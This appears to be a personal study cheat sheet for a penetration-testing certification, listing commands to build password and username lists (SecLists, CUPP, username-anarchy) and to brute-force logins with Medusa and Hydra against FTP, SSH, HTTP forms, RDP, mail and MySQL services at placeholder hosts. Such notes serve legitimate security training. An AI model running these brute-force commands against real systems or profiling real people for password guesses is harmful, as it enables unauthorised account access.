---
tags: [basics, technique, password]
---


> [!info] See also: [[Certifications/CPTS/Password Attacks|Password Attacks (CPTS — detailed)]] · [[Hydra]] · [[Medusa]] · [[John The Ripper]]


## Hybrid Attacks 
When working with Hybrid attacks we can use, what we know to refine an existing dictionary or build a new one with a proper basis 

```bash
# Fetch the content of a darkweb list 
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

# Use grep to get the elements which fulfill the min length requirement
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt

# Then we can also filter make sure that the password has at least one uppercase letter
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```


## Using username-anarchy to create username list

```bash
# Installation
git clone https://github.com/urbanadventurer/username-anarchy.git

# Generate Username Variations 
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## Using Cupp t ogenerate password lists based on OSINT

```bash
# Fill out the cupp information in an interactive manner
cupp -i

# Use the generated list and filter based on your requirements using grep
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

## Using Medusa for Attacks 

```bash
# FTP Attack 
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt

# HTTP Attack 
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^

# SSH Attack; with the -t we can add more parallel sessions
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh -t


# IMAP.... There are more modules, but for that just checkout the documentation
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt 

```

## Using Hydra for Attacks 

```bash

## ----------- General Commands ---------------

# Attacking multiple targets
hydra -l root -p toor -M targets.txt ssh

# Testing FTP on non standard port 
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Brute Forcing rdp login with password combination including lower,uppercase and numbers.
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

## ----------- Attacking specific Services ---------------
# FTP Attack
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100

# SSH Attack
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100

# Attack Webrequest 
hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# smtp
hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com

# pop3
hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com

# IMAP
hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com

# mysql
hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100

# RDP
hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100

```